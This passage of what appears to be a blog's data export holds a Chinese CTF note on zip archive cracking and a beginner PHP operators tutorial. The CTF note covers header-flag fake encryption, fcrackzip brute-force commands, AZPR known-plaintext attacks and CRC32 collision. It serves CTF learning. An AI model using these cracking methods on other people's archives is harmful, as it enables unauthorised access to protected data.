class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">压缩源文件数据区：</span><br><span class=\"line\">50 4B 03 04：这是头文件标记（0x04034b50） </span><br><span class=\"line\">14 00：解压文件所需 pkware 版本 </span><br><span class=\"line\">00 00：全局方式位标记（有无加密） </span><br><span class=\"line\">08 00：压缩方式 </span><br><span class=\"line\">20 9E：最后修改文件时间 </span><br><span class=\"line\">66 4F：最后修改文件日期 </span><br><span class=\"line\">F2 1B 0F 4A：CRC-32校验（4A0F1BF2）</span><br><span class=\"line\">0E 00 00 00：压缩后尺寸 </span><br><span class=\"line\">0C 00 00 00：未压缩尺寸</span><br><span class=\"line\">08 00：文件名长度 </span><br><span class=\"line\">00 00：扩展记录长度 </span><br><span class=\"line\">66 6C 61 67 2E 74 78 74: 文件名（不定长）</span><br><span class=\"line\">4B CB 49 4C AF 36 34 32 36 31 35 AB 05 00: 文件flag.txt压缩后的数据</span><br><span class=\"line\"></span><br><span class=\"line\">压缩源文件目录区：</span><br><span class=\"line\">50 4B 01 02：目录中文件文件头标记(0x02014b50) </span><br><span class=\"line\">1F 00：压缩使用的 pkware 版本</span><br><span class=\"line\">14 00：解压文件所需 pkware 版本 </span><br><span class=\"line\">00 00：全局方式位标记（有无加密，这个更改这里进行伪加密，改为09 00打开就会提示有密码了）</span><br><span class=\"line\">08 00：压缩方式</span><br><span class=\"line\">20 9E：最后修改文件时间</span><br><span class=\"line\">66 4F：最后修改文件日期 </span><br><span class=\"line\">F2 1B 0F 4A：CRC-32校验（4A0F1BF2）</span><br><span class=\"line\">0E 00 00 00：压缩后尺寸 </span><br><span class=\"line\">0C 00 00 00：未压缩尺寸 </span><br><span class=\"line\">08 00：文件名长度 </span><br><span class=\"line\">24 00：扩展字段长度 </span><br><span class=\"line\">00 00：文件注释长度</span><br><span class=\"line\">00 00：磁盘开始号</span><br><span class=\"line\">00 00：内部文件属性 </span><br><span class=\"line\">20 00 00 00：外部文件属性 </span><br><span class=\"line\">00 00 00 00：局部头部偏移量 </span><br><span class=\"line\">50 4B 05 06：目录结束标记</span><br><span class=\"line\">00 00：当前磁盘编号 </span><br><span class=\"line\">00 00：目录区开始磁盘编号</span><br><span class=\"line\">01 00：本磁盘上纪录总数</span><br><span class=\"line\">01 00：目录区中纪录总数 </span><br><span class=\"line\">5A 00 00 00：目录区尺寸大小 </span><br><span class=\"line\">34 00 00 00：目录区对第一张磁盘的偏移量</span><br><span class=\"line\">00 00 ：ZIP 文件注释长度</span><br></pre></td></tr></table></figure>\n<p><strong>伪加密：</strong><br>第一行的七八位，00 00是没有加密。（从这里可以判断出是否为伪加密）<br>第四行的十三，十四位00 00：全局方式位标记，有无加密，这个更改这里进行伪加密，改为09 00打开就会提示有密码了，这样就达到了zip伪加密的目的，可是这里又有一个疑问了，你可能会问，为什么改成09，而不是其他的数字呢，其实改成09只是举的一个例子，只要末位是奇数，就代表加密，反之，末位是偶数代表未加密，具体什么原理，可以去官网看一下。</p>\n<p>那么，如何辨别当前的zip是真的加密还是伪加密？</p>\n<p>无加密<br>压缩源文件数据区的全局加密应当为00 00  （504B0304两个bytes之后）<br>且压缩源文件目录区的全局方式位标记应当为00 00（504B0304四个bytes之后）</p>\n<p>假加密<br>压缩源文件数据区的全局加密应当为00 00<br>且压缩源文件目录区的全局方式位标记应当为09 00</p>\n<p>真加密<br>压缩源文件数据区的全局加密应当为09 00<br>且压缩源文件目录区的全局方式位标记应当为09 00 </p>\n<p>哦，对了。kail貌似可以直接打开伪加密的文件。</p>\n<p>知道了原理就可以解决问题了，如果是伪加密可以修改回来；但是要是真加密呐！咱们往下看。</p>\n<p><strong>0×02.暴力破解</strong></p>\n<p>说到暴力破解就要说到另外两个方法了。</p>\n<ol>\n<li><p>爆破：顾名思义，逐个尝试选定集合中可以组成的所有密码，知道遇到正确密码（密码短的还好说，密码长的话可能一年半个月也破解不出来）</p>\n</li>\n<li><p>字典：字典攻击的效率比爆破稍高，因为字典中存储了常用的密码，因此就避免了爆破时把时间浪费在脸滚键盘类的密码上</p>\n</li>\n<li><p>掩码攻击：如果已知密码的某几位，如已知6位密码的第3位是a，那么可以构造 ??a??? 进行掩码攻击，掩码攻击的原理相当于构造了第3位为a的字典，因此掩码攻击的效率也比爆破高出不少</p>\n</li>\n</ol>\n<p>暴力破解也可在kail里进行，软件为kali自带的fcrackzip<br>使用步骤</p>\n<blockquote>\n<p>fcrackzip -help<br><img src=\"https://img-blog.csdnimg.cn/20200420152716363.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODY5MDM5,size_16,color_FFFFFF,t_70\" alt=\"在这里插入图片描述\"><br>找到 上传压缩包所在文件目录,在此目录下进行操作<br><img src=\"https://img-blog.csdnimg.cn/20200420152833895.png\" alt=\"在这里插入图片描述\"><br>fcrackzip -b -c1 -l 1-4 -u 压缩文件 -v</p>\n</blockquote>\n<p><img src=\"https://img-blog.csdnimg.cn/20200420152928348.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODY5MDM5,size_16,color_FFFFFF,t_70\" alt=\"在这里插入图片描述\"><br>对于以上方法，当然推荐一款神器AZPR<br>爆破！<br><img src=\"https://img-blog.csdnimg.cn/20200420141549683.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODY5MDM5,size_16,color_FFFFFF,t_70\" alt=\"在这里插入图片描述\"><br>字典（合适的字典可以达到事半功倍的效果）！<br><img src=\"https://img-blog.csdnimg.cn/2020042014161979.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODY5MDM5,size_16,color_FFFFFF,t_70\" alt=\"在这里插入图片描述\"></p>\n<p>掩码攻击！<br><img src=\"https://img-blog.csdnimg.cn/20200420141753909.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODY5MDM5,size_16,color_FFFFFF,t_70\" alt=\"在这里插入图片描述\"><br><strong>0×03.明文攻击</strong></p>\n<p>原理：明文攻击（Known plaintext attack）是一种攻击模式，指攻击者已知明文、密文及算法，求密钥的过程。<br>同一个zip压缩包里的所有文件都是使用同一个加密密钥来加密的，所以可以用已知文件来找加密密钥，利用密钥来解锁其他加密文件。</p>\n<p>在网上找到一个例题，链接：<a href=\"http://ctf5.shiyanbar.com/misc/no.zip\" target=\"_blank\" rel=\"noopener\">这里</a><br>1解压这个zip文件，会得到flag.zip和tips.txt.提示“密码是十位大小写字母、数字、特殊符号组成的，你爆破的开么？！”<br>这就尴尬了，想暴力破解？不可能！！！</p>\n<p>不多说拉进winhex分析一波。<br><img src=\"https://img-blog.csdnimg.cn/20200420153917942.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODY5MDM5,size_16,color_FFFFFF,t_70\" alt=\"在这里插入图片描述\"><br>很明显 明文攻击 ！</p>\n<p>将明文tips.txt进行压缩，判断明文压缩后的CRC32是否与加密文件中的一致，若不一致可以换一个压缩工具。<br><img src=\"https://img-blog.csdnimg.cn/20200420154501231.png\" alt=\"在这里插入图片描述\"><br><img src=\"https://img-blog.csdnimg.cn/2020042015450914.png\" alt=\"在这里插入图片描述\"><br>上工具AZPR！<br><img src=\"https://img-blog.csdnimg.cn/20200420154555287.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODY5MDM5,size_16,color_FFFFFF,t_70\" alt=\"在这里插入图片描述\"><br>emmmmm 密码出来了。</p>\n<p><strong>0×04.CRC32爆破</strong><br>原理：它的全称是循环冗余校验(Cyclic Redundancy Check, CRC)，用来校验文件是否出错但并不能用于自动纠错。CRC32则表示会产生一个32bit（8位十六进制数）的校验值。<br><img src=\"https://img-blog.csdnimg.cn/2020042015513465.png\" alt=\"在这里插入图片描述\"><br>注意：限于CPU的能力，CRC碰撞只能用于压缩文件较小的情况.<br>神器：<a href=\"https://github.com/theonlypwner/crc32\" target=\"_blank\" rel=\"noopener\">CEC32</a><br>使用方法：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">python crc32.py reverse 你的crc32密文</span><br></pre></td></tr></table></figure>\n<p>具体的我也解释不清。<br><a href=\"https://www.360zhijia.com/360anquanke/217342.html\" target=\"_blank\" rel=\"noopener\">大佬文章</a></p>\n<p>持续更新！！！</p>\n"},{"title":"php学习--运算符（三）","date":"2020-05-06T07:04:05.000Z","photos":["https://cdn.jsdelivr.net/gh/yremp/cdn@2.1.5/img/cover/(8).jpg.webp"],"_content":"\n\n\n﻿前言：php的运算符与C语言比较，相似的地方有很多，相差的地方也很大啊！\n\n目录：\n **0×01：算数运算符**\n  ① +\n   就是1+1=2；\n```\n$a=1;\n$b=2;\n$c=$a+$b;\necho $c;\n```\n② ➖\n 1.单纯的减号 \n      \n ```\n$a=10;\n$b=2;\n$c=$a-$b;\necho $c;\n ```\n\n   2.取反\n\n\n```\n$a=1;\n$b=-$a;\necho $b; //-1\necho <br  />;\necho  $a;   //1\n```\n③ *  乘号\n```\n$a=3;\n$b=4;\n$c=$a*$b;\necho $c;\n```\n 就是简单的乘号。\n ④  /  除号\n```\n$a=10;\n$b=2;\n$c=$a/$b;\necho $c;\n```\n ⑤ --  ，++运算\n\n\n```\n ++$a;\n  --$a ;\n```\n就是先自增或者自减，让后$a参与运算。\n\n```\n$a--;\n$a++;\n```\n就是先让$a参与运算，让后进行自增或者自减。\n\n注意：\n\n```\n$a=10;\n   ++$a;\n echo $a;\n```\n这种情况 `++$a`与`$a++`都没有参与数值运算，情况相同，数值相同。\n\n  **0×02：字符串运算符**\n\n  PHP中的字符串运算符只有一个`.`,也成为连接运算符。\n\n   **0×03：赋值运算符**\n\n\n```\n=，+=，*=，-=，/=，%=，.=  等等\n```\n二元运算符：\n左边的操作数必须是变量，右边的可以是一个表达式，一个值，一个变量等等。\n\n①=：\n即赋值（不同于数学里的等于），即将等号右边的值赋给左边的变量。\n②\n\n```\n+=：$a+=$b;  //$a=$a+$b;\n-=:$a-=$b;    //$a=$a-$b;\n*=:$a*=$b;  //$a=$A*$b;\n/=:$a/=$b;   //$a=$S/$b;\n%=:$a%=$b;   //$a=$a%$b;   取余\n.=:$a=$b;    //$a=$a.$b\n```\n   **0×04：比较运算符**\n\n```\n==，===，!=, <> , !== , < , > , <= , >=等等\n```\n\n概念：对操作数进行比较，满足条件即为true，否则为false。\n\nPHP规定：\n                使用echo输出布尔类型值的时候；\n                echo true ;  显示结果为1\n                echo false;  显示为空白\n如果我们要输出布尔类型值的时候，我们最好使用var_dump()输出的结果更明了！\n         ①==   （值相等）\n```\n$a==$b;\nvar_dump（$a==$b）\n```\n\n   值相等为true，不相等为false。\n\n②=== (值相等，类型也要相等)\n\n```\n$a=11;\n$b='11';\nvar_dump($a==$b);  //true\necho <br     />;\nvar_dump($a===$b);    //false\n```\n③!=     ,<>(值不相等)\n\n```\n$a=1;\n$b=2;\nvar_dump($a!=$b);  //true\n```\n④   !==  (不全等)\n值或类型有一个相等的就可以。 \n\n⑤< , > , < = , >=  ;\n这个就是和数学里的一样，没必要细说。\n     **0×05：逻辑运算符**\n概念;对表达式进行逻辑运算，运算出来的结果是布尔类型的值（trure,false）,要求参与运算的值是布尔类型的，否则会被强制转换让后参与运算。\n以下值被认为false，其他的值都是被认为true。\n**布尔值false\n0\n浮点型0.0\n空白字符串和字符串0\n没有成员的数组\nNULL**\n\n①and  &&    (逻辑与)\n只有两边同时为true时，最后的结果才为true。\n\n②or   ||  (逻辑或)\n两边有一个为true时，最后的输出结果为true。也即是两边同时为false时，才能为false。\n\n③xor   (逻辑异或)\n左右两边的值不一样是结果为true，一样时为false。\n\n④ ！    逻辑非\n将原表达式的值否定掉，true变成false，false变成true。\n\n**0×06：位运算符**\n\n位运算符用于对操作数中的每一个二进制位进行运算。\n\n**0×07;其他运算符**\n\n\n\n①？ ：\n三元运算符\n表达式1 ？ 表达式2 ：表达式3；\n如果表达式1的值为true，则执行表达式2，否则执行表达式3。\n\n②'  '\n可以把系统的命令放在里面执行！（Windows系统）\n\n③@\n屏蔽表达式可能发生的错误！`注意：是表达式`\n\n> echo @$b;\n\n④=>  , ->  ,instanceof(先省略)\n\n**0×08：运算符的优先级**\n①【无】递增递减\n②【右->左】逻辑非\n③【左->右】乘，除，取余\n④【左】加，减，字符串连接\n⑤【无】包含大于号，小于号的运算符\n⑥【无】不包含大于号或者小于号的运算符\n⑦【左】逻辑与 && \n⑧【左】逻辑或 ||\n⑨【左】？   ：  \n⑩【右】赋值运算符\n⒒【左】逻辑异或 xor\n\n圆括号里的可以看成一个整体，并且圆括号可以增加程序的可读性。\n\n短路问题：\n\n```\n$a=false;\n$b=1;\n$a && ++$b;\necho $b;  //上面的$b直接被短路掉！并且数值不变！\n```\n\n语言设计者认为：只要有逻辑运算符（逻辑与，逻辑或），那么运算结果就是一个true或者false。整个程序的运行过程就不重要了。\n","source":"_posts/php学习--运算符（三）.md","raw":"---\ntitle: php学习--运算符（三）\ndate: 2020-05-06 15:04:05\ntags: php学习\ncategories: 技术\nphotos:  https://cdn.jsdelivr.net/gh/yremp/cdn@2.1.5/img/cover/(8).jpg.webp\n---\n\n\n\n﻿前言：php的运算符与C语言比较，相似的地方有很多，相差的地方也很大啊！\n\n目录：\n **0×01：算数运算符**\n  ① +\n   就是1+1=2；\n```\n$a=1;\n$b=2;\n$c=$a+$b;\necho $c;\n```\n② ➖\n 1.单纯的减号 \n      \n ```\n$a=10;\n$b=2;\n$c=$a-$b;\necho $c;\n ```\n\n   2.取反\n\n\n```\n$a=1;\n$b=-$a;\necho $b; //-1\necho <br  />;\necho  $a;   //1\n```\n③ *  乘号\n```\n$a=3;\n$b=4;\n$c=$a*$b;\necho $c;\n```\n 就是简单的乘号。\n ④  /  除号\n```\n$a=10;\n$b=2;\n$c=$a/$b;\necho $c;\n```\n ⑤ --  ，++运算\n\n\n```\n ++$a;\n  --$a ;\n```\n就是先自增或者自减，让后$a参与运算。\n\n```\n$a--;\n$a++;\n```\n就是先让$a参与运算，让后进行自增或者自减。\n\n注意：\n\n```\n$a=10;\n   ++$a;\n echo $a;\n```\n这种情况 `++$a`与`$a++`都没有参与数值运算，情况相同，数值相同。\n\n  **0×02：字符串运算符**\n\n  PHP中的字符串运算符只有一个`.`,也成为连接运算符。\n\n   **0×03：赋值运算符**\n\n\n```\n=，+=，*=，-=，/=，%=，.=  等等\n```\n二元运算符：\n左边的操作数必须是变量，右边的可以是一个表达式，一个值，一个变量等等。\n\n①=：\n即赋值（不同于数学里的等于），即将等号右边的值赋给左边的变量。\n②\n\n```\n+=：$a+=$b;  //$a=$a+$b;\n-=:$a-=$b;    //$a=$a-$b;\n*=:$a*=$b;  //$a=$A*$b;\n/=:$a/=$b;   //$a=$S/$b;\n%=:$a%=$b;   //$a=$a%$b;   取余\n.=:$a=$b;    //$a=$a.$b\n```\n   **0×04：比较运算符**\n\n```\n==，===，!=, <> , !== , < , > , <= , >=等等\n```\n\n概念：对操作数进行比较，满足条件即为true，否则为false。\n\nPHP规定：\n                使用echo输出布尔类型值的时候；\n                echo true ;  显示结果为1\n                echo false;  显示为空白\n如果我们要输出布尔类型值的时候，我们最好使用var_dump()输出的结果更明了！\n         ①==   （值相等）\n```\n$a==$b;\nvar_dump（$a==$b）\n```\n\n   值相等为true，不相等为false。\n\n②=== (值相等，类型也要相等)\n\n```\n$a=11;\n$b='11';\nvar_dump($a==$b);  //true\necho <br     />;\nvar_dump($a===$b);    //false\n```\n③!=     ,<>(值不相等)\n\n```\n$a=1;\n$b=2;\nvar_dump($a!=$b);  //true\n```\n④   !==  (不全等)\n值或类型有一个相等的就可以。 \n\n⑤< , > , < = , >=  ;\n这个就是和数学里的一样，没必要细说。\n     **0×05：逻辑运算符**\n概念;对表达式进行逻辑运算，运算出来的结果是布尔类型的值（trure,false）,要求参与运算的值是布尔类型的，否则会被强制转换让后参与运算。\n以下值被认为false，其他的值都是被认为true。\n**布尔值false\n0\n浮点型0.0\n空白字符串和字符串0\n没有成员的数组\nNULL**\n\n①and  &&    (逻辑与)\n只有两边同时为true时，最后的结果才为true。\n\n②or   ||  (逻辑或)\n两边有一个为true时，最后的输出结果为true。也即是两边同时为false时，才能为false。\n\n③xor   (逻辑异或)\n左右两边的值不一样是结果为true，一样时为false。\n\n④ ！    逻辑非\n将原表达式的值否定掉，true变成false，false变成true。\n\n**0×06：位运算符**\n\n位运算符用于对操作数中的每一个二进制位进行运算。\n\n**0×07;其他运算符**\n\n\n\n①？ ：\n三元运算符\n表达式1 ？ 表达式2 ：表达式3；\n如果表达式1的值为true，则执行表达式2，否则执行表达式3。\n\n②'  '\n可以把系统的命令放在里面执行！（Windows系统）\n\n③@\n屏蔽表达式可能发生的错误！`注意：是表达式`\n\n> echo @$b;\n\n④=>  , ->  ,instanceof(先省略)\n\n**0×08：运算符的优先级**\n①【无】递增递减\n②【右->左】逻辑非\n③【左->右】乘，除，取余\n④【左】加，减，字符串连接\n⑤【无】包含大于号，小于号的运算符\n⑥【无】不包含大于号或者小于号的运算符\n⑦【左】逻辑与 && \n⑧【左】逻辑或 ||\n⑨【左】？   ：  \n⑩【右】赋值运算符\n⒒【左】逻辑异或 xor\n\n圆括号里的可以看成一个整体，并且圆括号可以增加程序的可读性。\n\n短路问题：\n\n```\n$a=false;\n$b=1;\n$a && ++$b;\necho $b;  //上面的$b直接被短路掉！并且数值不变！\n```\n\n语言设计者认为：只要有逻辑运算符（逻辑与，逻辑或），那么运算结果就是一个true或者false。整个程序的运行过程就不重要了。\n","slug":"php学习--运算符（三）","published":1,"updated":"2020-05-11T09:08:47.043Z","comments":1,"layout":"post","link":"","_id":"ckchhpsha00149kq6ekt21tki","content":"<p>﻿前言：php的运算符与C语言比较，相似的地方有很多，相差的地方也很大啊！</p>\n<p>目录：<br> <strong>0×01：算数运算符</strong><br>  ① +<br>   就是1+1=2；</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$a&#x3D;1;</span><br><span class=\"line\">$b&#x3D;2;</span><br><span class=\"line\">$c&#x3D;$a+$b;</span><br><span class=\"line\">echo $c;</span><br></pre></td></tr></table></figure>\n<p>② ➖<br> 1.单纯的减号 </p>\n <figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$a&#x3D;10;</span><br><span class=\"line\">$b&#x3D;2;</span><br><span class=\"line\">$c&#x3D;$a-$b;</span><br><span class=\"line\">echo $c;</span><br></pre></td></tr></table></figure>\n\n<p>   2.取反</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$a&#x3D;1;</span><br><span class=\"line\">$b&#x3D;-$a;</span><br><span class=\"line\">echo $b; &#x2F;&#x2F;-1</span><br><span class=\"line\">echo &lt;br  &#x2F;&gt;;</span><br><span class=\"line\">echo  $a;   &#x2F;&#x2F;1</span><br></pre></td></tr></table></figure>\n<p>③ *  乘号</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$a&#x3D;3;</span><br><span class=\"line\">$b&#x3D;4;</span><br><span class=\"line\">$c&#x3D;$a*$b;</span><br><span class=\"line\">echo $c;</span><br></pre></td></tr></table></figure>\n<p> 就是简单的乘号。<br> ④  /  除号</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$a&#x3D;10;</span><br><span class=\"line\">$b&#x3D;2;</span><br><span class=\"line\">$c&#x3D;$a&#x2F;$b;</span><br><span class=\"line\">echo $c;</span><br></pre></td></tr></table></figure>\n<p> ⑤ –  ，++运算</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">++$a;</span><br><span class=\"line\"> --$a ;</span><br></pre></td></tr></table></figure>\n<p>就是先自增或者自减，让后$a参与运算。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$a--;</span><br><span class=\"line\">$a++;</span><br></pre></td></tr></table></figure>\n<p>就是先让$a参与运算，让后进行自增或者自减。</p>\n<p>注意：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$a&#x3D;10;</span><br><span class=\"line\">   ++$a;</span><br><span class=\"line\"> echo $a;</span><br></pre></td></tr></table></figure>\n<p>这种情况 <code>++$a</code>与<code>$a++</code>都没有参与数值运算，情况相同，数值相同。</p>\n<p>  <strong>0×02：字符串运算符</strong></p>\n<p>  PHP中的字符串运算符只有一个<code>.</code>,也成为连接运算符。</p>\n<p>   <strong>0×03：赋值运算符</strong></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#x3D;，+&#x3D;，*&#x3D;，-&#x3D;，&#x2F;&#x3D;，%&#x3D;，.&#x3D;  等等</span><br></pre></td></tr></table></figure>\n<p>二元运算符：<br>左边的操作数必须是变量，右边的可以是一个表达式，一个值，一个变量等等。</p>\n<p>①=：<br>即赋值（不同于数学里的等于），即将等号右边的值赋给左边的变量。<br>②</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">+&#x3D;：$a+&#x3D;$b;  &#x2F;&#x2F;$a&#x3D;$a+$b;</span><br><span class=\"line\">-&#x3D;:$a-&#x3D;$b;    &#x2F;&#x2F;$a&#x3D;$a-$b;</span><br><span class=\"line\">*&#x3D;:$a*&#x3D;$b;  &#x2F;&#x2F;$a&#x3D;$A*$b;</span><br><span class=\"line\">&#x2F;&#x3D;:$a&#x2F;&#x3D;$b;   &#x2F;&#x2F;$a&#x3D;$S&#x2F;$b;</span><br><span class=\"line\">%&#x3D;:$a%&#x3D;$b;   &#x2F;&#x2F;$a&#x3D;$a%$b;   取余</span><br><span class=\"line\">.&#x3D;:$a&#x3D;$b;    &#x2F;&#x2F;$a&#x3D;$a.$b</span><br></pre></td></tr></table></figure>\n<p>   <strong>0×04：比较运算符</strong></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#x3D;&#x3D;，&#x3D;&#x3D;&#x3D;，!&#x3D;, &lt;&gt; , !&#x3D;&#x3D; , &lt; , &gt; , &lt;&#x3D; , &gt;&#x3D;等等</span><br></pre></td></tr></table></figure>\n\n<p>概念：对操作数进行比较，满足条件即为true，否则为false。</p>\n<p>PHP规定：<br>                使用echo输出布尔类型值的时候；<br>                echo true ;  显示结果为1<br>                echo false;  显示为空白<br>如果我们要输出布尔类型值的时候，我们最好使用var_dump()输出的结果更明了！<br>         ①==   （值相等）</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$a&#x3D;&#x3D;$b;</span><br><span class=\"line\">var_dump（$a&#x3D;&#x3D;$b）</span><br></pre></td></tr></table></figure>\n\n<p>   值相等为true，不相等为false。</p>\n<p>②=== (值相等，类型也要相等)</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$a&#x3D;11;</span><br><span class=\"line\">$b&#x3D;&#39;11&#39;;</span><br><span class=\"line\">var_dump($a&#x3D;&#x3D;$b);  &#x2F;&#x2F;true</span><br><span class=\"line\">echo &lt;br     &#x2F;&gt;;</span><br><span class=\"line\">var_dump($a&#x3D;&#x3D;&#x3D;$b);    &#x2F;&#x2F;false</span><br></pre></td></tr></table></figure>\n<p>③!=     ,&lt;&gt;(值不相等)</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$a&#x3D;1;</span><br><span class=\"line\">$b&#x3D;2;</span><br><span class=\"line\">var_dump($a!&#x3D;$b);  &#x2F;&#x2F;true</span><br></pre></td></tr></table></figure>\n<p>④   !==  (不全等)<br>值或类型有一个相等的就可以。 </p>\n<p>⑤&lt; , &gt; , &lt; = , &gt;=  ;<br>这个就是和数学里的一样，没必要细说。<br>     <strong>0×05：逻辑运算符</strong><br>概念;对表达式进行逻辑运算，运算出来的结果是布尔类型的值（trure,false）,要求参与运算的值是布尔类型的，否则会被强制转换让后参与运算。<br>以下值被认为false，其他的值都是被认为true。<br><strong>布尔值false<br>0<br>浮点型0.0<br>空白字符串和字符串0<br>没有成员的数组<br>NULL</strong></p>\n<p>①and  &amp;&amp;    (逻辑与)<br>只有两边同时为true时，最后的结果才为true。</p>\n<p>②or   ||  (逻辑或)<br>两边有一个为true时，最后的输出结果为true。也即是两边同时为false时，才能为false。</p>\n<p>③xor   (逻辑异或)<br>左右两边的值不一样是结果为true，一样时为false。</p>\n<p>④ ！    逻辑非<br>将原表达式的值否定掉，true变成false，false变成true。</p>\n<p><strong>0×06：位运算符</strong></p>\n<p>位运算符用于对操作数中的每一个二进制位进行运算。</p>\n<p><strong>0×07;其他运算符</strong></p>\n<p>①？ ：<br>三元运算符<br>表达式1 ？ 表达式2 ：表达式3；<br>如果表达式1的值为true，则执行表达式2，否则执行表达式3。</p>\n<p>②’  ‘<br>可以把系统的命令放在里面执行！（Windows系统）</p>\n<p>③@<br>屏蔽表达式可能发生的错误！<code>注意：是表达式</code></p>\n<blockquote>\n<p>echo @$b;</p>\n</blockquote>\n<p>④=&gt;  , -&gt;  ,instanceof(先省略)</p>\n<p><strong>0×08：运算符的优先级</strong><br>①【无】递增递减<br>②【右-&gt;左】逻辑非<br>③【左-&gt;右】乘，除，取余<br>④【左】加，减，字符串连接<br>⑤【无】包含大于号，小于号的运算符<br>⑥【无】不包含大于号或者小于号的运算符<br>⑦【左】逻辑与 &amp;&amp;<br>⑧【左】逻辑或 ||<br>⑨【左】？   ：<br>⑩【右】赋值运算符<br>⒒【左】逻辑异或 xor</p>\n<p>圆括号里的可以看成一个整体，并且圆括号可以增加程序的可读性。</p>\n<p>短路问题：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$a&#x3D;false;</span><br><span class=\"line\">$b&#x3D;1;</span><br><span class=\"line\">$a &amp;&amp; ++$b;</span><br><span class=\"line\">echo $b;  &#x2F;&#x2F;上面的$b直接被短路掉！并且数值不变！</span><br></pre></td></tr></table></figure>\n\n<p>语言设计者认为：只要有逻辑运算符（逻辑与，逻辑或），那么运算结果就是一个true或者false。整个程序的运行过程就不重要了。</p>\n","site":{"data":{}},"excerpt":"","more":"<p>﻿前言：php的运算符与C语言比较，相似的地方有很多，相差的地方也很大啊！</p>\n<p>目录：<br> <strong>0×01：算数运算符</strong><br>  ① +<br>   就是1+1=2；</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$a&#x3D;1;</span><br><span class=\"line\">$b&#x3D;2;</span><br><span class=\"line\">$c&#x3D;$a+$b;</span><br><span class=\"line\">echo $c;</span><br></pre></td></tr></table></figure>\n<p>② ➖<br> 1.单纯的减号 </p>\n <figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span 